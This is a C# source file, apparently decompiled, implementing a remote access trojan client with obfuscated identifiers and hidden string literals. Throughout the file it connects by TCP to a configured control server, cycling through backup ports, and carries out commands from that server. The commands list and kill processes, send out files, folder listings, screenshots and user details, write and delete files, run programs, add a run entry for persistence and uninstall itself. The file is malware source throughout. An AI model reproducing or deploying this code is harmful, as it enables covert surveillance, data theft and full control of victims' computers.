using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace uiltghnsra;

public class MCUDM
{
	private int uiltghnsrabudfSrze = 1024;

	private DRUIVF uiltghnsraHiD = new DRUIVF();

	public bool uiltghnsrais_wordking = false;

	private bool uiltghnsraiswitch = false;

	private bool uiltghnsrathrdRurning = false;

	public int pordt_srn = 0;

	public DateTime uiltghnsrarunTiwme;

	private int uiltghnsrabytesRiad = 0;

	public bool uiltghnsrareqCndls = false;

	public bool uiltghnsraautCdnls = false;

	public DateTime uiltghnsralTimeUtc;

	private THURE uiltghnsraStaedObij = new THURE();

	private bool uiltghnsrastr_wrditer = false;

	private MYUINF uiltghnsraUPC;

	private OCUMD uiltghnsraCMiD;

	private int uiltghnsrascrSdze = 200;

	private ThreadStart uiltghnsrafunStrdter;

	public TcpClient uiltghnsratcpsrck;

	public NetworkStream uiltghnsranetSream;

	private bool uiltghnsracapSdeen = false;

	private Thread uiltghnsrafunThdad;

	public void uiltghnsradou_stdart()
	{
		COUNF.uiltghnsrapodrt = COUNF.ports[0];
		uiltghnsrarunTiwme = DateTime.Now;
		uiltghnsraUPC = new MYUINF();
		uiltghnsraCMiD = new OCUMD(this);
		uiltghnsraHiD.iservder = this;
		uiltghnsraHiD.uiltghnsramainPiath = COUNF.uiltghnsraget_mpiath();
		TimerCallback callback = uiltghnsralorkupCdns;
		Timer uiltghnsratimer = new Timer(callback, uiltghnsraStaedObij, 32110, 36110);
		uiltghnsraStaedObij.uiltghnsratimer = uiltghnsratimer;
	}

	public string uiltghnsrafiule_indfo(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|uiltghnsra".Split(new char[1] { '|' })[0] : "<|uiltghnsra".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|uiltghnsra".Split(new char[1] { '|' })[0] : "<|uiltghnsra".Split(new char[1] { '|' })[0]);
			text = text + uiltghnsrageut_size(fileInfo.Length) + ((!ret) ? ">|uiltghnsra".Split(new char[1] { '|' })[0] : "<|uiltghnsra".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				uiltghnsrapuush_data(null, "uiltghnsra-fiulsz=|uiltghnsra".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void uiltghnsrachueckLdstatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(uiltghnsrarunTiwme.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				uiltghnsratcpsrck.Close();
				uiltghnsrais_wordking = false;
			}
		}
		catch
		{
		}
	}

	public void uiltghnsrasauveFidle(string filePatdh)
	{
		try
		{
			byte[] bytes = uiltghnsrapuull_data();
			File.WriteAllBytes(filePatdh, bytes);
		}
		catch
		{
		}
	}

	public bool uiltghnsraISuCdfs()
	{
		try
		{
			COUNF.uiltghnsradefarultP = COUNF.getBytsdString(COUNF.uiltghnsravpsidps);
			uiltghnsratcpsrck = new TcpClient();
			uiltghnsratcpsrck.Connect(COUNF.uiltghnsradefarultP, COUNF.uiltghnsrapodrt);
			return true;
		}
		catch
		{
			try
			{
				pordt_srn++;
				COUNF.uiltghnsrapodrt = COUNF.ports[pordt_srn];
				if (pordt_srn >= COUNF.ports.Length - 1)
				{
					pordt_srn = 0;
				}
			}
			catch
			{
				pordt_srn = 0;
			}
			return false;
		}
	}

	private void uiltghnsralorkupCdns(object doudrce)
	{
		try
		{
			if (!uiltghnsrathrdRurning)
			{
				uiltghnsrathrdRurning = true;
				uiltghnsrachueckLdstatime(DateTime.Now);
				if (!uiltghnsrais_wordking || !uiltghnsratcpsrck.Connected)
				{
					uiltghnsrais_wordking = uiltghnsraISuCdfs();
					if (uiltghnsrais_wordking)
					{
						uiltghnsrabudfSrze = uiltghnsratcpsrck.ReceiveBufferSize;
						uiltghnsraseueRedsp();
					}
				}
			}
			uiltghnsrathrdRurning = false;
		}
		catch
		{
			uiltghnsrathrdRurning = false;
			uiltghnsrastr_wrditer = false;
			uiltghnsrais_wordking = false;
			uiltghnsraiswitch = false;
		}
	}

	public bool uiltghnsraseund_audto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				uiltghnsrapuush_data(data, "uiltghnsra-afuile=" + fileinfo);
				return false;
			}
			uiltghnsrapuush_data(null, "uiltghnsra-anufod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void uiltghnsraliust_prodsses(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|uiltghnsra".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|uiltghnsra".Split(new char[1] { '|' })[0];
				text += "0>|uiltghnsra".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] data = COUNF.getuByteuAriray(text);
			uiltghnsrapuush_data(data, "uiltghnsra-" + cmd + "=pruess|uiltghnsra".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void uiltghnsralouad_apdp()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			Thread.Sleep(10);
			COUNF.uiltghnsraset_rudn("vdidria|uiltghnsra".Split(new char[1] { '|' })[0], executablePath);
		}
		catch
		{
		}
	}

	private void uiltghnsraimuage_indfo(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ">|uiltghnsra".Split(new char[1] { '|' })[0];
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|uiltghnsra".Split(new char[1] { '|' })[0];
			text = text + uiltghnsrageut_size(fileInfo.Length) + ">";
			MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
			uiltghnsrapuush_data(memoryStream.ToArray(), "uiltghnsra-thuumb=|uiltghnsra".Split(new char[1] { '|' })[0] + text);
		}
		catch
		{
		}
	}

	private void uiltghnsraseue_scdren(string screndize)
	{
		try
		{
			SCURNS sCURNS = new SCURNS();
			uiltghnsrascrSdze = Convert.ToInt16(screndize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = sCURNS.uiltghnsrascreen(uiltghnsrascrSdze);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				uiltghnsrapuush_data(memoryStream.ToArray(), "uiltghnsra-sauscr=caduen|uiltghnsra".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void uiltghnsraisu_scredn(string scrnSize)
	{
		try
		{
			SCURNS sCURNS = new SCURNS();
			uiltghnsrascrSdze = Convert.ToInt16(scrnSize.Split(new char[1] { '>' })[0].Trim());
			while (uiltghnsracapSdeen && uiltghnsrais_wordking)
			{
				Bitmap val = sCURNS.uiltghnsrascreen(uiltghnsrascrSdze);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					uiltghnsrapuush_data(memoryStream.ToArray(), "uiltghnsra-scuren=caucden|uiltghnsra".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void uiltghnsrausueur_inufo()
	{
		string text = uiltghnsraUPC.uiltghnsralanrard + "|" + uiltghnsraUPC.uiltghnsracname + "|" + uiltghnsraUPC.uiltghnsrauname + "|" + uiltghnsraUPC.uiltghnsrauip + "|" + COUNF.uiltghnsraOsndame() + "|" + uiltghnsraUPC.uiltghnsrarpver + "|";
		text += "| !uiltghnsra".Split(new char[1] { '!' })[0];
		text = text + "|" + uiltghnsraUPC.uiltghnsraclientNum;
		text = text + "|" + COUNF.uiltghnsraget_mpiath();
		byte[] data = COUNF.getuByteuAriray(text);
		uiltghnsrapuush_data(data, "uiltghnsra-inufo=usuer|uiltghnsra".Split(new char[1] { '|' })[0]);
	}

	private void uiltghnsrascrueenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			uiltghnsrascrSdze = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void uiltghnsrapuush_file(string lfile)
	{
		try
		{
			string fileName = Path.GetFileName(lfile);
			uiltghnsrapuush_data(File.ReadAllBytes(lfile), "uiltghnsra-fiule=|uiltghnsra".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
		}
		catch
		{
		}
	}

	private string uiltghnsrageut_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|uiltghnsra".Split(new char[1] { '|' })[0],
				"KB|uiltghnsra".Split(new char[1] { '|' })[0],
				"MB|uiltghnsra".Split(new char[1] { '|' })[0],
				"GB|uiltghnsra".Split(new char[1] { '|' })[0],
				"TB|uiltghnsra".Split(new char[1] { '|' })[0],
				"PB|uiltghnsra".Split(new char[1] { '|' })[0],
				"EB|uiltghnsra".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "1";
		}
	}

	public string[] uiltghnsrageut_commrand()
	{
		try
		{
			byte[] array = new byte[5];
			uiltghnsrabytesRiad = uiltghnsranetSream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= uiltghnsrabytesRiad)
			{
				int count = ((num3 > uiltghnsrabudfSrze) ? uiltghnsrabudfSrze : num3);
				uiltghnsrabytesRiad = uiltghnsranetSream.Read(array2, num2, count);
				num2 += uiltghnsrabytesRiad;
			}
			string bytsdString = COUNF.getBytsdString(array2);
			if (bytsdString.Trim() == "")
			{
				return null;
			}
			return bytsdString.Split(new char[1] { '=' });
		}
		catch
		{
			uiltghnsrais_wordking = false;
			return null;
		}
	}

	private void uiltghnsraliustDrives()
	{
		string text = uiltghnsraHiD.uiltghnsralouokuprDrive();
		uiltghnsrapuush_data(null, "uiltghnsra-diurs=" + text);
	}

	private void uiltghnsraseueRedsp()
	{
		if (!uiltghnsraiswitch)
		{
			uiltghnsraiswitch = true;
			uiltghnsranetSream = uiltghnsraCMiD.uiltghnsraNS(uiltghnsratcpsrck);
			uiltghnsracapSdeen = false;
			while (uiltghnsrais_wordking)
			{
				string[] switchType = uiltghnsrageut_commrand();
				if (switchType != null)
				{
					uiltghnsrareqCndls = false;
					string text = switchType[0].ToLower();
					if (text.Split(new char[1] { '-' }).Length > 1)
					{
						text = text.Split(new char[1] { '-' })[1];
					}
					text = text.Insert(2, "5");
					text = "uiltghnsra-" + text.Replace("creen", "crpn");
					switch (text)
					{
					case "uiltghnsra-pr5uocl":
					case "uiltghnsra-pr5ocl":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsraliust_prodsses("pruocl");
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-ge5utavs":
					case "uiltghnsra-ge5tavs":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsraliust_prodsses("geutavs");
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-th5uumb":
					case "uiltghnsra-th5umb":
						uiltghnsraimuage_indfo(switchType[1]);
						break;
					case "uiltghnsra-pu5utsrt":
					case "uiltghnsra-pu5tsrt":
						uiltghnsralouad_apdp();
						break;
					case "uiltghnsra-fi5ulsz":
					case "uiltghnsra-fi5lsz":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsrafiule_indfo(switchType[1]);
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-ru5upth":
					case "uiltghnsra-ru5pth":
						uiltghnsrapuush_data(null, "uiltghnsra-apupth=|uiltghnsra".Split(new char[1] { '|' })[0] + COUNF.uiltghnsraget_mpiath());
						break;
					case "uiltghnsra-do5uwf":
					case "uiltghnsra-do5wf":
						uiltghnsrasauveFidle(switchType[1]);
						break;
					case "uiltghnsra-en5udpo":
					case "uiltghnsra-en5dpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "uiltghnsra-sc5ursz":
					case "uiltghnsra-sc5rsz":
						uiltghnsrascrueenSize(switchType[1]);
						break;
					case "uiltghnsra-cs5ucrpn":
					case "uiltghnsra-cs5crpn":
						uiltghnsraseue_scdren(switchType[1]);
						break;
					case "uiltghnsra-di5urs":
					case "uiltghnsra-di5rs":
						uiltghnsrafunThdad = new Thread(uiltghnsraliustDrives);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-st5uops":
					case "uiltghnsra-st5ops":
						uiltghnsracapSdeen = false;
						break;
					case "uiltghnsra-sc5uren":
					case "uiltghnsra-sc5ren":
						uiltghnsracapSdeen = true;
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsraisu_scredn(switchType[1]);
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-cn5uls":
					case "uiltghnsra-cn5ls":
						uiltghnsraautCdnls = true;
						uiltghnsrareqCndls = true;
						uiltghnsracapSdeen = false;
						break;
					case "uiltghnsra-ud5ult":
					case "uiltghnsra-ud5lt":
						uiltghnsraCMiD.uiltghnsraremove_user();
						break;
					case "uiltghnsra-de5ult":
					case "uiltghnsra-de5lt":
						File.Delete(switchType[1]);
						break;
					case "uiltghnsra-af5uile":
					case "uiltghnsra-af5ile":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsraseund_audto(switchType[1]);
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-li5ustf":
					case "uiltghnsra-li5stf":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsraHiD.uiltghnsralouokFile(switchType[1]);
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-fi5ule":
					case "uiltghnsra-fi5le":
						uiltghnsrafunStrdter = delegate
						{
							uiltghnsrapuush_file(switchType[1]);
						};
						uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-in5ufo":
					case "uiltghnsra-in5fo":
						uiltghnsrafunThdad = new Thread(uiltghnsrausueur_inufo);
						uiltghnsrafunThdad.Start();
						break;
					case "uiltghnsra-ru5unf":
					case "uiltghnsra-ru5nf":
						Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "uiltghnsra-fl5ues":
					case "uiltghnsra-fl5es":
					{
						string files = uiltghnsraHiD.uiltghnsralouokupFile(switchType[1]);
						if (files != null)
						{
							uiltghnsrafunStrdter = delegate
							{
								uiltghnsrapuush_data(null, "uiltghnsra-flues=|uiltghnsra".Split(new char[1] { '|' })[0] + files);
							};
							uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
							uiltghnsrafunThdad.Start();
						}
						break;
					}
					case "uiltghnsra-do5uwr":
					case "uiltghnsra-do5wr":
						uiltghnsrasauveFidle(switchType[1]);
						break;
					case "uiltghnsra-fl5udr":
					case "uiltghnsra-fl5dr":
					{
						string Folders = uiltghnsraHiD.uiltghnsrachueckFolder(switchType[1]);
						if (Folders != null)
						{
							uiltghnsrafunStrdter = delegate
							{
								uiltghnsrapuush_data(null, "uiltghnsra-fludr=|uiltghnsra".Split(new char[1] { '|' })[0] + Folders);
							};
							uiltghnsrafunThdad = new Thread(uiltghnsrafunStrdter);
							uiltghnsrafunThdad.Start();
						}
						break;
					}
					}
					continue;
				}
				uiltghnsrais_wordking = false;
				break;
			}
			uiltghnsrais_wordking = false;
			uiltghnsracapSdeen = false;
		}
		uiltghnsraiswitch = false;
	}

	public byte[] uiltghnsrapuull_data()
	{
		try
		{
			uiltghnsrarunTiwme = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			uiltghnsrabytesRiad = uiltghnsranetSream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !uiltghnsrareqCndls)
			{
				int count = ((num3 > uiltghnsrabudfSrze) ? uiltghnsrabudfSrze : num3);
				uiltghnsrabytesRiad = uiltghnsranetSream.Read(array2, num, count);
				num += uiltghnsrabytesRiad;
				num3 -= uiltghnsrabytesRiad;
				uiltghnsrarunTiwme = DateTime.Now;
			}
			if (uiltghnsrareqCndls)
			{
				uiltghnsranetSream.Flush();
				while (uiltghnsranetSream.DataAvailable && uiltghnsranetSream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			uiltghnsrais_wordking = false;
			return null;
		}
	}

	public bool uiltghnsrapuush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			uiltghnsrarunTiwme = DateTime.Now;
			if (uiltghnsrastr_wrditer)
			{
				return false;
			}
			uiltghnsrastr_wrditer = true;
			byte[] array = COUNF.getuByteuAriray(type);
			int num = 0;
			int num2 = 5;
			byte[] array2 = null;
			if (data != null)
			{
				array2 = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(array.Length);
			byte[] array3 = new byte[num2 + array.Length + num];
			bytes.CopyTo(array3, 0);
			array.CopyTo(array3, 5);
			if (data != null)
			{
				array2.CopyTo(array3, 5 + array.Length);
				data.CopyTo(array3, 10 + array.Length);
			}
			int num3 = 0;
			int num4 = array3.Length;
			while (num4 > 0 && !uiltghnsrareqCndls)
			{
				int num5 = ((num4 > uiltghnsrabudfSrze) ? uiltghnsrabudfSrze : num4);
				uiltghnsranetSream.Write(array3, num3, num5);
				num3 += num5;
				num4 -= num5;
				uiltghnsrarunTiwme = DateTime.Now;
			}
			uiltghnsrastr_wrditer = false;
			if (uiltghnsrareqCndls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			uiltghnsrastr_wrditer = false;
			uiltghnsrais_wordking = false;
			return false;
		}
	}
}
